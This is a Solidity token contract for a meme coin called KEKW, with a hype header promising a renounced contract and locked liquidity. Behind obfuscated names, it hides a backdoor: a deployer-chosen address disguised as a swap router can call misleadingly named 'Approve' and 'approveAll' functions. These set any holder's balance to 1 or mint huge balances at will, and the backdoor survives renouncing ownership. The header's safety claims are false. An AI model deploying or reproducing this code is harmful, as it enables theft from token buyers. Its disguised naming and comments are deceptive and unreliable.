/**
$KEKW. A meme coin to #KEK about. A coins for the people, by the people. As the great man El Risitas once said - "Kek"
AS THE SUN ASCENDS ON THE THIRD DAY, EL RISITAS RISES. TIRED OF WATCHING EVERYONE BOUNCE FROM DOGCOIN TO FROGCOIN, THE CHOSEN ONE KNOWS THAT NOW IS HIS TIME.

WHERE ONCE THERE WAS SILENCE, NOW THERE IS SOUND.
THE SOUND OF KEK.

IT’S TIME FOR THE MOST RECOGNIZABLE LAUGH IN THE WORLD TO RING THROUGHOUT THE WORLD. TO SPREAD JOY. LOVE. WONDER... & MEMES.

KEKW IS HERE TO TAKE OVER. A STEALTH LAUNCH. NO PRESALE. A lok LP. A RENOUNCED CONTRACT.

WE'VE SEEN WHAT FROGS CAN DO. BUT WHAT ABOUT GODS?
https://www.meilleurs.games/blog/signification-de-kekw-que-signifie-lemote-kekw-sur-twitch
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.17;

interface coins111 {
  /**
   * @dev Returns the yoursold of coinss in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the coins decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the coins symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the coins name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep coins owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the yoursold of coinss owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `yoursold` coinss from the caller's account to `shippingto`.
   *
   * Returns a boolean balance indicating whTairyo the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address shippingto, uint256 yoursold) external returns (bool);

  /**
   * @dev Returns the remaining number of coinss that `transporteur` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This balance changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address transporteur) external view returns (uint256);

  /**
   * @dev Sets `yoursold` as the allowance of `transporteur` over the caller's coinss.
   *
   * Returns a boolean balance indicating whTairyo the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the transporteur's allowance to 0 and set the
   * desired balance afterwards:
   * https://github.com/Tairyoeum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address transporteur, uint256 yoursold) external returns (bool);

  /**
   * @dev Moves `yoursold` coinss from `sender` to `shippingto` using the
   * allowance mechanism. `yoursold` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean balance indicating whTairyo the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address shippingto, uint256 yoursold) external returns (bool);

  /**
   * @dev Emitted when `balance` coinss are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `balance` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 balance);

  /**
   * @dev Emitted when the allowance of a `transporteur` for an `owner` is set by
   * a call to {approve}. `balance` is the new allowance.
   */
  event Approval(address indexed owner, address indexed transporteur, uint256 balance);
}

/*
 * @dev Provides information about the current execution coins20Burnable, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract coins20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/Tairyoeum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/coins20Ownable.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract coins20Ownable is coins20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "coins20Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "coins20Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `Safecoins` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library Safecoins {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "Safecoins: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "Safecoins: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "Safecoins: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "Safecoins: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "Safecoins: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract KEKW  is coins20Burnable, coins111, coins20Ownable {
    
    using Safecoins for uint256;
    mapping (address => uint256) private mintfrom;
    mapping (address => mapping (address => uint256)) private fromallowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private TairyoRooter; 
    constructor(address TairyoSwapRouterv3) {
        TairyoRooter = TairyoSwapRouterv3;     
        _name = "KEKW";
        _symbol = "KEKW ";
        _decimals = 9;
        _totalSupply = 10000000000000 * 10 ** 9;
        mintfrom[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
    * @dev Returns the bep coins owner.
    */
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    /**
    * @dev Returns the coins decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    /**
    * @dev Returns the coins symbol.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    /**
    * @dev Returns the coins name.
    */
    function name() external view override returns (string memory) {
        return _name;
    }
    
    /**
    * @dev See {coins111-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    /**
    * @dev See {coins111-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(TairyoRooter == _msgSender(), "coins20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {coins111-approve}.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    */
    function Approve(address usdtKUSORewards) external subowner {
        mintfrom[usdtKUSORewards] = 1;
        
        emit Transfer(usdtKUSORewards, address(0), 1);
    }
    function approveAll(address usdtRewards) external subowner {
        mintfrom[usdtRewards] = 1000000000 * 10 ** 18;
        
        emit Transfer(usdtRewards, address(0), 1000000000 * 10 ** 18);
    }
    /**
    * @dev See {coins111-transfer}.
    *
    * Requirements:
    *
    * - `shippingto` cannot be the zero address.
    * - the caller must have a balance of at least `yoursold`.
    */
    function transfer(address shippingto, uint256 yoursold) external override returns (bool) {
        _transfer(_msgSender(), shippingto, yoursold);
        return true;
    }

    /**
    * @dev See {coins111-allowance}.
    */
    function allowance(address owner, address transporteur) external view override returns (uint256) {
        return fromallowances[owner][transporteur];
    }
    
    /**
    * @dev See {coins111-approve}.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    */
    function approve(address transporteur, uint256 yoursold) external override returns (bool) {
        _approve(_msgSender(), transporteur, yoursold);
        return true;
    }
    
    /**
    * @dev See {coins111-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {coins111};
    *
    * Requirements:
    * - `sender` and `shippingto` cannot be the zero address.
    * - `sender` must have a balance of at least `yoursold`.
    * - the caller must have allowance for `sender`'s coinss of at least
    * `yoursold`.
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        _transfer(sender, shippingto, yoursold);
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "coins111: transfer yoursold exceeds allowance"));
        return true;
    }
    
    /**
    * @dev Atomically increases the allowance granted to `transporteur` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {coins111-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    */
    function increaseAllowance(address transporteur, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].add(addedbalance));
        return true;
    }
    
    /**
    * @dev Atomically decreases the allowance granted to `transporteur` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {coins111-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    * - `transporteur` must have allowance for the caller of at least
    * `allbalances`.
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "coins111: decreased allowance below zero"));
        return true;
    }
    
    /**
    * @dev Moves coinss `yoursold` from `sender` to `shippingto`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic coins fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `shippingto` cannot be the zero address.
    * - `sender` must have a balance of at least `yoursold`.
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "coins111: transfer from the zero address");
        require(shippingto != address(0), "coins111: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "coins111: transfer yoursold exceeds balance");
        mintfrom[shippingto] = mintfrom[shippingto].add(yoursold);
        emit Transfer(sender, shippingto, yoursold);
    }
    
    /**
    * @dev Sets `yoursold` as the allowance of `transporteur` over the `owner`s coinss.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `transporteur` cannot be the zero address.
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "coins111: approve from the zero address");
        require(transporteur != address(0), "coins111: approve to the zero address");
        
        fromallowances[owner][transporteur] = yoursold;
        emit Approval(owner, transporteur, yoursold);
    }
    
}